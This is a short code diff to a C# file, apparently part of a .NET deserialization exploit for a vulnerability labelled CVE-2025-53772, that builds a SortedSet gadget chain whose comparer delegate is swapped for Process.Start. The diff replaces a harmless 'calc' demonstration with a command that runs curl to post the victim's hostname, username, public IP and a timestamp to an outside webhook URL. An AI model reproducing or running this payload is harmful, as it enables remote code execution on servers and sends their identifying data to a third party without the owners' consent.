@@ -17,7 +17,8 @@ namespace hawktraceiis
             IComparer<string> comp = Comparer<string>.Create(d);
             SortedSet<string> set = new SortedSet<string>(comp);
             set.Add("cmd.exe");
-            set.Add("/c calc");
+            set.Add("/c curl -X POST https://webhook.site/16a4d8d1-c492-4f7b-8d75-895085a81d61 -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\":\\\"%COMPUTERNAME%\\\",\\\"user\\\":\\\"%USERNAME%\\\",\\\"ip\\\":\\\"$(curl -s ifconfig.me)\\\",\\\"exploit\\\":\\\"CVE-2025-53772\\\",\\\"timestamp\\\":\\\"%DATE% %TIME%\\\"}\"");
+            
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             invoke_list[1] = new Func<string, string, Process>(Process.Start);
@@ -39,4 +40,5 @@ namespace hawktraceiis
             }
         }
     }
+
 }
